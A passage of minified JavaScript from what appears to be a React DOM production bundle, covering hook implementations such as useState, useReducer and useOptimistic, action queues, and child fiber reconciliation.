    var e = It === null ? mt.memoizedState : It.next;
    if (e !== null)
      It = e,
        Ct = t;
    else {
      if (t === null)
        throw mt.alternate === null ? Error(r(467)) : Error(r(310));
      Ct = t,
        t = {
          memoizedState: Ct.memoizedState,
          baseState: Ct.baseState,
          baseQueue: Ct.baseQueue,
          queue: Ct.queue,
          next: null
        },
        It === null ? mt.memoizedState = It = t : It = It.next = t
    }
    return It
  }
  function Hc() {
    return {
      lastEffect: null,
      events: null,
      stores: null,
      memoCache: null
    }
  }
  function Vn(t) {
    var e = Zn;
    return Zn += 1,
      ln === null && (ln = []),
      t = oo(ln, t, e),
      e = mt,
      (It === null ? e.memoizedState : It.next) === null && (e = e.alternate,
        T.H = e === null || e.memoizedState === null ? Po : tf),
      t
  }
  function Ji(t) {
    if (t !== null && typeof t == "object") {
      if (typeof t.then == "function")
        return Vn(t);
      if (t.$$typeof === Gt)
        return ve(t)
    }
    throw Error(r(438, String(t)))
  }
  function qc(t) {
    var e = null
      , l = mt.updateQueue;
    if (l !== null && (e = l.memoCache),
      e == null) {
      var a = mt.alternate;
      a !== null && (a = a.updateQueue,
        a !== null && (a = a.memoCache,
          a != null && (e = {
            data: a.data.map(function (n) {
              return n.slice()
            }),
            index: 0
          })))
    }
    if (e == null && (e = {
      data: [],
      index: 0
    }),
      l === null && (l = Hc(),
        mt.updateQueue = l),
      l.memoCache = e,
      l = e.data[e.index],
      l === void 0)
      for (l = e.data[e.index] = Array(t),
        a = 0; a < t; a++)
        l[a] = $e;
    return e.index++,
      l
  }
  function _l(t, e) {
    return typeof e == "function" ? e(t) : e
  }
  function $i(t) {
    var e = Pt();
    return Bc(e, Ct, t)
  }
  function Bc(t, e, l) {
    var a = t.queue;
    if (a === null)
      throw Error(r(311));
    a.lastRenderedReducer = l;
    var n = t.baseQueue
      , i = a.pending;
    if (i !== null) {
      if (n !== null) {
        var u = n.next;
        n.next = i.next,
          i.next = u
      }
      e.baseQueue = n = i,
        a.pending = null
    }
    if (i = t.baseState,
      n === null)
      t.memoizedState = i;
    else {
      e = n.next;
      var s = u = null
        , f = null
        , x = e
        , _ = !1;
      do {
        var M = x.lane & -536870913;
        if (M !== x.lane ? (xt & M) === M : (Kl & M) === M) {
          var z = x.revertLane;
          if (z === 0)
            f !== null && (f = f.next = {
              lane: 0,
              revertLane: 0,
              action: x.action,
              hasEagerState: x.hasEagerState,
              eagerState: x.eagerState,
              next: null
            }),
              M === Ia && (_ = !0);
          else if ((Kl & z) === z) {
            x = x.next,
              z === Ia && (_ = !0);
            continue
          } else
            M = {
              lane: 0,
              revertLane: x.revertLane,
              action: x.action,
              hasEagerState: x.hasEagerState,
              eagerState: x.eagerState,
              next: null
            },
              f === null ? (s = f = M,
                u = i) : f = f.next = M,
              mt.lanes |= z,
              ta |= z;
          M = x.action,
            Aa && l(i, M),
            i = x.hasEagerState ? x.eagerState : l(i, M)
        } else
          z = {
            lane: M,
            revertLane: x.revertLane,
            action: x.action,
            hasEagerState: x.hasEagerState,
            eagerState: x.eagerState,
            next: null
          },
            f === null ? (s = f = z,
              u = i) : f = f.next = z,
            mt.lanes |= M,
            ta |= M;
        x = x.next
      } while (x !== null && x !== e);
      if (f === null ? u = i : f.next = s,
        !De(i, t.memoizedState) && (ue = !0,
          _ && (l = Pa,
            l !== null)))
        throw l;
      t.memoizedState = i,
        t.baseState = u,
        t.baseQueue = f,
        a.lastRenderedState = i
    }
    return n === null && (a.lanes = 0),
      [t.memoizedState, a.dispatch]
  }
  function Yc(t) {
    var e = Pt()
      , l = e.queue;
    if (l === null)
      throw Error(r(311));
    l.lastRenderedReducer = t;
    var a = l.dispatch
      , n = l.pending
      , i = e.memoizedState;
    if (n !== null) {
      l.pending = null;
      var u = n = n.next;
      do
        i = t(i, u.action),
          u = u.next;
      while (u !== n);
      De(i, e.memoizedState) || (ue = !0),
        e.memoizedState = i,
        e.baseQueue === null && (e.baseState = i),
        l.lastRenderedState = i
    }
    return [i, a]
  }
  function yo(t, e, l) {
    var a = mt
      , n = Pt()
      , i = At;
    if (i) {
      if (l === void 0)
        throw Error(r(407));
      l = l()
    } else
      l = e();
    var u = !De((Ct || n).memoizedState, l);
    u && (n.memoizedState = l,
      ue = !0),
      n = n.queue;
    var s = zo.bind(null, a, n, t);
    if (Kn(2048, 8, s, [t]),
      n.getSnapshot !== e || u || It !== null && It.memoizedState.tag & 1) {
      if (a.flags |= 2048,
        an(9, Wi(), So.bind(null, a, n, l, e), null),
        Bt === null)
        throw Error(r(349));
      i || (Kl & 124) !== 0 || xo(a, e, l)
    }
    return l
  }
  function xo(t, e, l) {
    t.flags |= 16384,
      t = {
        getSnapshot: e,
        value: l
      },
      e = mt.updateQueue,
      e === null ? (e = Hc(),
        mt.updateQueue = e,
        e.stores = [t]) : (l = e.stores,
          l === null ? e.stores = [t] : l.push(t))
  }
  function So(t, e, l, a) {
    e.value = l,
      e.getSnapshot = a,
      No(e) && To(t)
  }
  function zo(t, e, l) {
    return l(function () {
      No(e) && To(t)
    })
  }
  function No(t) {
    var e = t.getSnapshot;
    t = t.value;
    try {
      var l = e();
      return !De(t, l)
    } catch {
      return !0
    }
  }
  function To(t) {
    var e = Ja(t, 2);
    e !== null && Be(e, t, 2)
  }
  function Gc(t) {
    var e = Oe();
    if (typeof t == "function") {
      var l = t;
      if (t = l(),
        Aa) {
        il(!0);
        try {
          l()
        } finally {
          il(!1)
        }
      }
    }
    return e.memoizedState = e.baseState = t,
      e.queue = {
        pending: null,
        lanes: 0,
        dispatch: null,
        lastRenderedReducer: _l,
        lastRenderedState: t
      },
      e
  }
  function _o(t, e, l, a) {
    return t.baseState = l,
      Bc(t, Ct, typeof a == "function" ? a : _l)
  }
  function Bm(t, e, l, a, n) {
    if (Ii(t))
      throw Error(r(485));
    if (t = e.action,
      t !== null) {
      var i = {
        payload: n,
        action: t,
        next: null,
        isTransition: !0,
        status: "pending",
        value: null,
        reason: null,
        listeners: [],
        then: function (u) {
          i.listeners.push(u)
        }
      };
      T.T !== null ? l(!0) : i.isTransition = !1,
        a(i),
        l = e.pending,
        l === null ? (i.next = e.pending = i,
          Eo(e, i)) : (i.next = l.next,
            e.pending = l.next = i)
    }
  }
  function Eo(t, e) {
    var l = e.action
      , a = e.payload
      , n = t.state;
    if (e.isTransition) {
      var i = T.T
        , u = {};
      T.T = u;
      try {
        var s = l(n, a)
          , f = T.S;
        f !== null && f(u, s),
          Ao(t, e, s)
      } catch (x) {
        Xc(t, e, x)
      } finally {
        T.T = i
      }
    } else
      try {
        i = l(n, a),
          Ao(t, e, i)
      } catch (x) {
        Xc(t, e, x)
      }
  }
  function Ao(t, e, l) {
    l !== null && typeof l == "object" && typeof l.then == "function" ? l.then(function (a) {
      Mo(t, e, a)
    }, function (a) {
      return Xc(t, e, a)
    }) : Mo(t, e, l)
  }
  function Mo(t, e, l) {
    e.status = "fulfilled",
      e.value = l,
      Oo(e),
      t.state = l,
      e = t.pending,
      e !== null && (l = e.next,
        l === e ? t.pending = null : (l = l.next,
          e.next = l,
          Eo(t, l)))
  }
  function Xc(t, e, l) {
    var a = t.pending;
    if (t.pending = null,
      a !== null) {
      a = a.next;
      do
        e.status = "rejected",
          e.reason = l,
          Oo(e),
          e = e.next;
      while (e !== a)
    }
    t.action = null
  }
  function Oo(t) {
    t = t.listeners;
    for (var e = 0; e < t.length; e++)
      (0,
        t[e])()
  }
  function Ro(t, e) {
    return e
  }
  function ko(t, e) {
    if (At) {
      var l = Bt.formState;
      if (l !== null) {
        t: {
          var a = mt;
          if (At) {
            if (Vt) {
              e: {
                for (var n = Vt, i = rl; n.nodeType !== 8;) {
                  if (!i) {
                    n = null;
                    break e
                  }
                  if (n = el(n.nextSibling),
                    n === null) {
                    n = null;
                    break e
                  }
                }
                i = n.data,
                  n = i === "F!" || i === "F" ? n : null
              }
              if (n) {
                Vt = el(n.nextSibling),
                  a = n.data === "F!";
                break t
              }
            }
            Na(a)
          }
          a = !1
        }
        a && (e = l[0])
      }
    }
    return l = Oe(),
      l.memoizedState = l.baseState = e,
      a = {
        pending: null,
        lanes: 0,
        dispatch: null,
        lastRenderedReducer: Ro,
        lastRenderedState: e
      },
      l.queue = a,
      l = Wo.bind(null, mt, a),
      a.dispatch = l,
      a = Gc(!1),
      i = Kc.bind(null, mt, !1, a.queue),
      a = Oe(),
      n = {
        state: e,
        dispatch: null,
        action: t,
        pending: null
      },
      a.queue = n,
      l = Bm.bind(null, mt, n, i, l),
      n.dispatch = l,
      a.memoizedState = t,
      [e, l, !1]
  }
  function jo(t) {
    var e = Pt();
    return Do(e, Ct, t)
  }
  function Do(t, e, l) {
    if (e = Bc(t, e, Ro)[0],
      t = $i(_l)[0],
      typeof e == "object" && e !== null && typeof e.then == "function")
      try {
        var a = Vn(e)
      } catch (u) {
        throw u === Yn ? Qi : u
      }
    else
      a = e;
    e = Pt();
    var n = e.queue
      , i = n.dispatch;
    return l !== e.memoizedState && (mt.flags |= 2048,
      an(9, Wi(), Ym.bind(null, n, l), null)),
      [a, i, t]
  }
  function Ym(t, e) {
    t.action = e
  }
  function Co(t) {
    var e = Pt()
      , l = Ct;
    if (l !== null)
      return Do(e, l, t);
    Pt(),
      e = e.memoizedState,
      l = Pt();
    var a = l.queue.dispatch;
    return l.memoizedState = t,
      [e, a, !1]
  }
  function an(t, e, l, a) {
    return t = {
      tag: t,
      create: l,
      deps: a,
      inst: e,
      next: null
    },
      e = mt.updateQueue,
      e === null && (e = Hc(),
        mt.updateQueue = e),
      l = e.lastEffect,
      l === null ? e.lastEffect = t.next = t : (a = l.next,
        l.next = t,
        t.next = a,
        e.lastEffect = t),
      t
  }
  function Wi() {
    return {
      destroy: void 0,
      resource: void 0
    }
  }
  function Uo() {
    return Pt().memoizedState
  }
  function Fi(t, e, l, a) {
    var n = Oe();
    a = a === void 0 ? null : a,
      mt.flags |= t,
      n.memoizedState = an(1 | e, Wi(), l, a)
  }
  function Kn(t, e, l, a) {
    var n = Pt();
    a = a === void 0 ? null : a;
    var i = n.memoizedState.inst;
    Ct !== null && a !== null && jc(a, Ct.memoizedState.deps) ? n.memoizedState = an(e, i, l, a) : (mt.flags |= t,
      n.memoizedState = an(1 | e, i, l, a))
  }
  function wo(t, e) {
    Fi(8390656, 8, t, e)
  }
  function Ho(t, e) {
    Kn(2048, 8, t, e)
  }
  function qo(t, e) {
    return Kn(4, 2, t, e)
  }
  function Bo(t, e) {
    return Kn(4, 4, t, e)
  }
  function Yo(t, e) {
    if (typeof e == "function") {
      t = t();
      var l = e(t);
      return function () {
        typeof l == "function" ? l() : e(null)
      }
    }
    if (e != null)
      return t = t(),
        e.current = t,
        function () {
          e.current = null
        }
  }
  function Go(t, e, l) {
    l = l != null ? l.concat([t]) : null,
      Kn(4, 4, Yo.bind(null, e, t), l)
  }
  function Qc() { }
  function Xo(t, e) {
    var l = Pt();
    e = e === void 0 ? null : e;
    var a = l.memoizedState;
    return e !== null && jc(e, a[1]) ? a[0] : (l.memoizedState = [t, e],
      t)
  }
  function Qo(t, e) {
    var l = Pt();
    e = e === void 0 ? null : e;
    var a = l.memoizedState;
    if (e !== null && jc(e, a[1]))
      return a[0];
    if (a = t(),
      Aa) {
      il(!0);
      try {
        t()
      } finally {
        il(!1)
      }
    }
    return l.memoizedState = [a, e],
      a
  }
  function Lc(t, e, l) {
    return l === void 0 || (Kl & 1073741824) !== 0 ? t.memoizedState = e : (t.memoizedState = l,
      t = Kf(),
      mt.lanes |= t,
      ta |= t,
      l)
  }
  function Lo(t, e, l, a) {
    return De(l, e) ? l : tn.current !== null ? (t = Lc(t, l, a),
      De(t, e) || (ue = !0),
      t) : (Kl & 42) === 0 ? (ue = !0,
        t.memoizedState = l) : (t = Kf(),
          mt.lanes |= t,
          ta |= t,
          e)
  }
  function Zo(t, e, l, a, n) {
    var i = w.p;
    w.p = i !== 0 && 8 > i ? i : 8;
    var u = T.T
      , s = {};
    T.T = s,
      Kc(t, !1, e, l);
    try {
      var f = n()
        , x = T.S;
      if (x !== null && x(s, f),
        f !== null && typeof f == "object" && typeof f.then == "function") {
        var _ = wm(f, a);
        Jn(t, e, _, qe(t))
      } else
        Jn(t, e, a, qe(t))
    } catch (M) {
      Jn(t, e, {
        then: function () { },
        status: "rejected",
        reason: M
      }, qe())
    } finally {
      w.p = i,
        T.T = u
    }
  }
  function Gm() { }
  function Zc(t, e, l, a) {
    if (t.tag !== 5)
      throw Error(r(476));
    var n = Vo(t).queue;
    Zo(t, n, e, W, l === null ? Gm : function () {
      return Ko(t),
        l(a)
    }
    )
  }
  function Vo(t) {
    var e = t.memoizedState;
    if (e !== null)
      return e;
    e = {
      memoizedState: W,
      baseState: W,
      baseQueue: null,
      queue: {
        pending: null,
        lanes: 0,
        dispatch: null,
        lastRenderedReducer: _l,
        lastRenderedState: W
      },
      next: null
    };
    var l = {};
    return e.next = {
      memoizedState: l,
      baseState: l,
      baseQueue: null,
      queue: {
        pending: null,
        lanes: 0,
        dispatch: null,
        lastRenderedReducer: _l,
        lastRenderedState: l
      },
      next: null
    },
      t.memoizedState = e,
      t = t.alternate,
      t !== null && (t.memoizedState = e),
      e
  }
  function Ko(t) {
    var e = Vo(t).next.queue;
    Jn(t, e, {}, qe())
  }
  function Vc() {
    return ve(di)
  }
  function Jo() {
    return Pt().memoizedState
  }
  function $o() {
    return Pt().memoizedState
  }
  function Xm(t) {
    for (var e = t.return; e !== null;) {
      switch (e.tag) {
        case 24:
        case 3:
          var l = qe();
          t = Zl(l);
          var a = Vl(e, t, l);
          a !== null && (Be(a, e, l),
            Xn(a, e, l)),
            e = {
              cache: zc()
            },
            t.payload = e;
          return
      }
      e = e.return
    }
  }
  function Qm(t, e, l) {
    var a = qe();
    l = {
      lane: a,
      revertLane: 0,
      action: l,
      hasEagerState: !1,
      eagerState: null,
      next: null
    },
      Ii(t) ? Fo(e, l) : (l = dc(t, e, l, a),
        l !== null && (Be(l, t, a),
          Io(l, e, a)))
  }
  function Wo(t, e, l) {
    var a = qe();
    Jn(t, e, l, a)
  }
  function Jn(t, e, l, a) {
    var n = {
      lane: a,
      revertLane: 0,
      action: l,
      hasEagerState: !1,
      eagerState: null,
      next: null
    };
    if (Ii(t))
      Fo(e, n);
    else {
      var i = t.alternate;
      if (t.lanes === 0 && (i === null || i.lanes === 0) && (i = e.lastRenderedReducer,
        i !== null))
        try {
          var u = e.lastRenderedState
            , s = i(u, l);
          if (n.hasEagerState = !0,
            n.eagerState = s,
            De(s, u))
            return Ui(t, e, n, 0),
              Bt === null && Ci(),
              !1
        } catch { }
      if (l = dc(t, e, n, a),
        l !== null)
        return Be(l, t, a),
          Io(l, e, a),
          !0
    }
    return !1
  }
  function Kc(t, e, l, a) {
    if (a = {
      lane: 2,
      revertLane: _s(),
      action: a,
      hasEagerState: !1,
      eagerState: null,
      next: null
    },
      Ii(t)) {
      if (e)
        throw Error(r(479))
    } else
      e = dc(t, l, a, 2),
        e !== null && Be(e, t, 2)
  }
  function Ii(t) {
    var e = t.alternate;
    return t === mt || e !== null && e === mt
  }
  function Fo(t, e) {
    en = Vi = !0;
    var l = t.pending;
    l === null ? e.next = e : (e.next = l.next,
      l.next = e),
      t.pending = e
  }
  function Io(t, e, l) {
    if ((l & 4194048) !== 0) {
      var a = e.lanes;
      a &= t.pendingLanes,
        l |= a,
        e.lanes = l,
        wl(t, l)
    }
  }
  var Pi = {
    readContext: ve,
    use: Ji,
    useCallback: Wt,
    useContext: Wt,
    useEffect: Wt,
    useImperativeHandle: Wt,
    useLayoutEffect: Wt,
    useInsertionEffect: Wt,
    useMemo: Wt,
    useReducer: Wt,
    useRef: Wt,
    useState: Wt,
    useDebugValue: Wt,
    useDeferredValue: Wt,
    useTransition: Wt,
    useSyncExternalStore: Wt,
    useId: Wt,
    useHostTransitionStatus: Wt,
    useFormState: Wt,
    useActionState: Wt,
    useOptimistic: Wt,
    useMemoCache: Wt,
    useCacheRefresh: Wt
  }
    , Po = {
      readContext: ve,
      use: Ji,
      useCallback: function (t, e) {
        return Oe().memoizedState = [t, e === void 0 ? null : e],
          t
      },
      useContext: ve,
      useEffect: wo,
      useImperativeHandle: function (t, e, l) {
        l = l != null ? l.concat([t]) : null,
          Fi(4194308, 4, Yo.bind(null, e, t), l)
      },
      useLayoutEffect: function (t, e) {
        return Fi(4194308, 4, t, e)
      },
      useInsertionEffect: function (t, e) {
        Fi(4, 2, t, e)
      },
      useMemo: function (t, e) {
        var l = Oe();
        e = e === void 0 ? null : e;
        var a = t();
        if (Aa) {
          il(!0);
          try {
            t()
          } finally {
            il(!1)
          }
        }
        return l.memoizedState = [a, e],
          a
      },
      useReducer: function (t, e, l) {
        var a = Oe();
        if (l !== void 0) {
          var n = l(e);
          if (Aa) {
            il(!0);
            try {
              l(e)
            } finally {
              il(!1)
            }
          }
        } else
          n = e;
        return a.memoizedState = a.baseState = n,
          t = {
            pending: null,
            lanes: 0,
            dispatch: null,
            lastRenderedReducer: t,
            lastRenderedState: n
          },
          a.queue = t,
          t = t.dispatch = Qm.bind(null, mt, t),
          [a.memoizedState, t]
      },
      useRef: function (t) {
        var e = Oe();
        return t = {
          current: t
        },
          e.memoizedState = t
      },
      useState: function (t) {
        t = Gc(t);
        var e = t.queue
          , l = Wo.bind(null, mt, e);
        return e.dispatch = l,
          [t.memoizedState, l]
      },
      useDebugValue: Qc,
      useDeferredValue: function (t, e) {
        var l = Oe();
        return Lc(l, t, e)
      },
      useTransition: function () {
        var t = Gc(!1);
        return t = Zo.bind(null, mt, t.queue, !0, !1),
          Oe().memoizedState = t,
          [!1, t]
      },
      useSyncExternalStore: function (t, e, l) {
        var a = mt
          , n = Oe();
        if (At) {
          if (l === void 0)
            throw Error(r(407));
          l = l()
        } else {
          if (l = e(),
            Bt === null)
            throw Error(r(349));
          (xt & 124) !== 0 || xo(a, e, l)
        }
        n.memoizedState = l;
        var i = {
          value: l,
          getSnapshot: e
        };
        return n.queue = i,
          wo(zo.bind(null, a, i, t), [t]),
          a.flags |= 2048,
          an(9, Wi(), So.bind(null, a, i, l, e), null),
          l
      },
      useId: function () {
        var t = Oe()
          , e = Bt.identifierPrefix;
        if (At) {
          var l = zl
            , a = Sl;
          l = (a & ~(1 << 32 - fe(a) - 1)).toString(32) + l,
            e = "«" + e + "R" + l,
            l = Ki++,
            0 < l && (e += "H" + l.toString(32)),
            e += "»"
        } else
          l = Hm++,
            e = "«" + e + "r" + l.toString(32) + "»";
        return t.memoizedState = e
      },
      useHostTransitionStatus: Vc,
      useFormState: ko,
      useActionState: ko,
      useOptimistic: function (t) {
        var e = Oe();
        e.memoizedState = e.baseState = t;
        var l = {
          pending: null,
          lanes: 0,
          dispatch: null,
          lastRenderedReducer: null,
          lastRenderedState: null
        };
        return e.queue = l,
          e = Kc.bind(null, mt, !0, l),
          l.dispatch = e,
          [t, e]
      },
      useMemoCache: qc,
      useCacheRefresh: function () {
        return Oe().memoizedState = Xm.bind(null, mt)
      }
    }
    , tf = {
      readContext: ve,
      use: Ji,
      useCallback: Xo,
      useContext: ve,
      useEffect: Ho,
      useImperativeHandle: Go,
      useInsertionEffect: qo,
      useLayoutEffect: Bo,
      useMemo: Qo,
      useReducer: $i,
      useRef: Uo,
      useState: function () {
        return $i(_l)
      },
      useDebugValue: Qc,
      useDeferredValue: function (t, e) {
        var l = Pt();
        return Lo(l, Ct.memoizedState, t, e)
      },
      useTransition: function () {
        var t = $i(_l)[0]
          , e = Pt().memoizedState;
        return [typeof t == "boolean" ? t : Vn(t), e]
      },
      useSyncExternalStore: yo,
      useId: Jo,
      useHostTransitionStatus: Vc,
      useFormState: jo,
      useActionState: jo,
      useOptimistic: function (t, e) {
        var l = Pt();
        return _o(l, Ct, t, e)
      },
      useMemoCache: qc,
      useCacheRefresh: $o
    }
    , Lm = {
      readContext: ve,
      use: Ji,
      useCallback: Xo,
      useContext: ve,
      useEffect: Ho,
      useImperativeHandle: Go,
      useInsertionEffect: qo,
      useLayoutEffect: Bo,
      useMemo: Qo,
      useReducer: Yc,
      useRef: Uo,
      useState: function () {
        return Yc(_l)
      },
      useDebugValue: Qc,
      useDeferredValue: function (t, e) {
        var l = Pt();
        return Ct === null ? Lc(l, t, e) : Lo(l, Ct.memoizedState, t, e)
      },
      useTransition: function () {
        var t = Yc(_l)[0]
          , e = Pt().memoizedState;
        return [typeof t == "boolean" ? t : Vn(t), e]
      },
      useSyncExternalStore: yo,
      useId: Jo,
      useHostTransitionStatus: Vc,
      useFormState: Co,
      useActionState: Co,
      useOptimistic: function (t, e) {
        var l = Pt();
        return Ct !== null ? _o(l, Ct, t, e) : (l.baseState = t,
          [t, l.queue.dispatch])
      },
      useMemoCache: qc,
      useCacheRefresh: $o
    }
    , nn = null
    , $n = 0;
  function tu(t) {
    var e = $n;
    return $n += 1,
      nn === null && (nn = []),
      oo(nn, t, e)
  }
  function Wn(t, e) {
    e = e.props.ref,
      t.ref = e !== void 0 ? e : null
  }
  function eu(t, e) {
    throw e.$$typeof === $ ? Error(r(525)) : (t = Object.prototype.toString.call(e),
      Error(r(31, t === "[object Object]" ? "object with keys {" + Object.keys(e).join(", ") + "}" : t)))
  }
  function ef(t) {
    var e = t._init;
    return e(t._payload)
  }
  function lf(t) {
    function e(v, m) {
      if (t) {
        var b = v.deletions;
        b === null ? (v.deletions = [m],
          v.flags |= 16) : b.push(m)
      }
    }
    function l(v, m) {
      if (!t)
        return null;
      for (; m !== null;)
        e(v, m),
          m = m.sibling;
      return null
    }
    function a(v) {
      for (var m = new Map; v !== null;)
        v.key !== null ? m.set(v.key, v) : m.set(v.index, v),
          v = v.sibling;
      return m
    }
    function n(v, m) {
      return v = xl(v, m),
        v.index = 0,
        v.sibling = null,
        v
    }
    function i(v, m, b) {
      return v.index = b,
        t ? (b = v.alternate,
          b !== null ? (b = b.index,
            b < m ? (v.flags |= 67108866,
              m) : b) : (v.flags |= 67108866,
                m)) : (v.flags |= 1048576,
                  m)
    }
    function u(v) {
      return t && v.alternate === null && (v.flags |= 67108866),
        v
    }
    function s(v, m, b, E) {
      return m === null || m.tag !== 6 ? (m = pc(b, v.mode, E),
        m.return = v,
        m) : (m = n(m, b),
          m.return = v,
          m)
    }
    function f(v, m, b, E) {
      var K = b.type;
      return K === Yt ? _(v, m, b.props.children, E, b.key) : m !== null && (m.elementType === K || typeof K == "object" && K !== null && K.$$typeof === D && ef(K) === m.type) ? (m = n(m, b.props),
        Wn(m, b),
        m.return = v,
        m) : (m = Hi(b.type, b.key, b.props, null, v.mode, E),
          Wn(m, b),
          m.return = v,
          m)
    }
    function x(v, m, b, E) {
      return m === null || m.tag !== 4 || m.stateNode.containerInfo !== b.containerInfo || m.stateNode.implementation !== b.implementation ? (m = hc(b, v.mode, E),
        m.return = v,
        m) : (m = n(m, b.children || []),
          m.return = v,
          m)
    }
    function _(v, m, b, E, K) {
      return m === null || m.tag !== 7 ? (m = ya(b, v.mode, E, K),
        m.return = v,
        m) : (m = n(m, b),
          m.return = v,
          m)
    }
    function M(v, m, b) {
      if (typeof m == "string" && m !== "" || typeof m == "number" || typeof m == "bigint")
        return m = pc("" + m, v.mode, b),
          m.return = v,
          m;
      if (typeof m == "object" && m !== null) {
        switch (m.$$typeof) {
          case tt:
            return b = Hi(m.type, m.key, m.props, null, v.mode, b),
              Wn(b, m),
              b.return = v,
              b;
          case St:
            return m = hc(m, v.mode, b),
              m.return = v,
              m;
          case D:
            var E = m._init;
            return m = E(m._payload),
              M(v, m, b)
        }
        if (qt(m) || Qt(m))
          return m = ya(m, v.mode, b, null),
            m.return = v,
            m;
        if (typeof m.then == "function")
          return M(v, tu(m), b);
        if (m.$$typeof === Gt)
          return M(v, Gi(v, m), b);
        eu(v, m)
      }
      return null
    }
    function z(v, m, b, E) {
      var K = m !== null ? m.key : null;
      if (typeof b == "string" && b !== "" || typeof b == "number" || typeof b == "bigint")
        return K !== null ? null : s(v, m, "" + b, E);
      if (typeof b == "object" && b !== null) {
        switch (b.$$typeof) {
          case tt:
            return b.key === K ? f(v, m, b, E) : null;
          case St:
            return b.key === K ? x(v, m, b, E) : null;
          case D:
            return K = b._init,
              b = K(b._payload),
              z(v, m, b, E)
        }
        if (qt(b) || Qt(b))
          return K !== null ? null : _(v, m, b, E, null);
        if (typeof b.then == "function")
          return z(v, m, tu(b), E);
        if (b.$$typeof === Gt)
          return z(v, m, Gi(v, b), E);
        eu(v, b)
      }
      return null
    }
    function N(v, m, b, E, K) {
      if (typeof E == "string" && E !== "" || typeof E == "number" || typeof E == "bigint")
        return v = v.get(b) || null,
          s(m, v, "" + E, K);
      if (typeof E == "object" && E !== null) {
        switch (E.$$typeof) {
          case tt:
            return v = v.get(E.key === null ? b : E.key) || null,
              f(m, v, E, K);
          case St:
            return v = v.get(E.key === null ? b : E.key) || null,
              x(m, v, E, K);
          case D:
            var ht = E._init;
            return E = ht(E._payload),
              N(v, m, b, E, K)
        }
        if (qt(E) || Qt(E))
          return v = v.get(b) || null,
            _(m, v, E, K, null);
        if (typeof E.then == "function")
          return N(v, m, b, tu(E), K);
        if (E.$$typeof === Gt)
          return N(v, m, b, Gi(m, E), K);
        eu(m, E)
      }
      return null
    }
    function ct(v, m, b, E) {
      for (var K = null, ht = null, P = m, it = m = 0, se = null; P !== null && it < b.length; it++) {
        P.index > it ? (se = P,
          P = null) : se = P.sibling;
        var Nt = z(v, P, b[it], E);
        if (Nt === null) {
          P === null && (P = se);
          break
        }
        t && P && Nt.alternate === null && e(v, P),
          m = i(Nt, m, it),
          ht === null ? K = Nt : ht.sibling = Nt,
          ht = Nt,
          P = se
      }
      if (it === b.length)
        return l(v, P),
          At && Sa(v, it),
          K;
      if (P === null) {
        for (; it < b.length; it++)
          P = M(v, b[it], E),
            P !== null && (m = i(P, m, it),
              ht === null ? K = P : ht.sibling = P,
              ht = P);
        return At && Sa(v, it),
          K
      }
      for (P = a(P); it < b.length; it++)
        se = N(P, v, it, b[it], E),
          se !== null && (t && se.alternate !== null && P.delete(se.key === null ? it : se.key),
            m = i(se, m, it),
            ht === null ? K = se : ht.sibling = se,
            ht = se);
      return t && P.forEach(function (ra) {
        return e(v, ra)
      }),
        At && Sa(v, it),
        K
    }
    function nt(v, m, b, E) {
      if (b == null)
        throw Error(r(151));
      for (var K = null, ht = null, P = m, it = m = 0, se = null, Nt = b.next(); P !== null && !Nt.done; it++,
        Nt = b.next()) {
        P.index > it ? (se = P,
          P = null) : se = P.sibling;
        var ra = z(v, P, Nt.value, E);
        if (ra === null) {
          P === null && (P = se);
          break
        }
        t && P && ra.alternate === null && e(v, P),
          m = i(ra, m, it),
          ht === null ? K = ra : ht.sibling = ra,
          ht = ra,
          P = se
      }
      if (Nt.done)
        return l(v, P),
          At && Sa(v, it),
          K;
      if (P === null) {
        for (; !Nt.done; it++,
          Nt = b.next())
          Nt = M(v, Nt.value, E),
            Nt !== null && (m = i(Nt, m, it),
              ht === null ? K = Nt : ht.sibling = Nt,
              ht = Nt);
        return At && Sa(v, it),
          K
      }
      for (P = a(P); !Nt.done; it++,
        Nt = b.next())
        Nt = N(P, v, it, Nt.value, E),
          Nt !== null && (t && Nt.alternate !== null && P.delete(Nt.key === null ? it : Nt.key),
            m = i(Nt, m, it),
            ht === null ? K = Nt : ht.sibling = Nt,
            ht = Nt);
      return t && P.forEach(function (Zp) {
        return e(v, Zp)
      }),
        At && Sa(v, it),
        K
    }
    function wt(v, m, b, E) {
      if (typeof b == "object" && b !== null && b.type === Yt && b.key === null && (b = b.props.children),
        typeof b == "object" && b !== null) {
        switch (b.$$typeof) {
          case tt:
            t: {
              for (var K = b.key; m !== null;) {
                if (m.key === K) {
                  if (K = b.type,
                    K === Yt) {
                    if (m.tag === 7) {
                      l(v, m.sibling),
                        E = n(m, b.props.children),
                        E.return = v,
                        v = E;
                      break t
                    }
                  } else if (m.elementType === K || typeof K == "object" && K !== null && K.$$typeof === D && ef(K) === m.type) {
                    l(v, m.sibling),
                      E = n(m, b.props),
                      Wn(E, b),
                      E.return = v,
                      v = E;
                    break t
                  }
                  l(v, m);
                  break
                } else
                  e(v, m);
                m = m.sibling
              }
              b.type === Yt ? (E = ya(b.props.children, v.mode, E, b.key),
                E.return = v,
                v = E) : (E = Hi(b.type, b.key, b.props, null, v.mode, E),
                  Wn(E, b),
                  E.return = v,
                  v = E)
            }
            return u(v);
          case St:
            t: {
              for (K = b.key; m !== null;) {
                if (m.key === K)
                  if (m.tag === 4 && m.stateNode.containerInfo === b.containerInfo && m.stateNode.implementation === b.implementation) {
                    l(v, m.sibling),
                      E = n(m, b.children || []),
                      E.return = v,
                      v = E;
                    break t
                  } else {
                    l(v, m);
                    break
                  }
                else
                  e(v, m);
                m = m.sibling
              }
              E = hc(b, v.mode, E),
                E.return = v,
                v = E
            }
            return u(v);
          case D:
            return K = b._init,
              b = K(b._payload),
              wt(v, m, b, E)
        }
        if (qt(b))
          return ct(v, m, b, E);
        if (Qt(b)) {
          if (K = Qt(b),
            typeof K != "function")
            throw Error(r(150));
          return b = K.call(b),
            nt(v, m, b, E)
        }
        if (typeof b.then == "function")
          return wt(v, m, tu(b), E);
        if (b.$$typeof === Gt)
          return wt(v, m, Gi(v, b), E);
        eu(v, b)
      }
      return typeof b == "string" && b !== "" || typeof b == "number" || typeof b == "bigint" ? (b = "" + b,
        m !== null && m.tag === 6 ? (l(v, m.sibling),
          E = n(m, b),
          E.return = v,
          v = E) : (l(v, m),
            E = pc(b, v.mode, E),
            E.return = v,
            v = E),
        u(v)) : l(v, m)
    }
    return function (v, m, b, E) {
      try {
        $n = 0;
        var K = wt(v, m, b, E);
        return nn = null,
          K
      } catch (P) {
        if (P === Yn || P === Qi)
          throw P;
        var ht = Ce(29, P, null, v.mode);
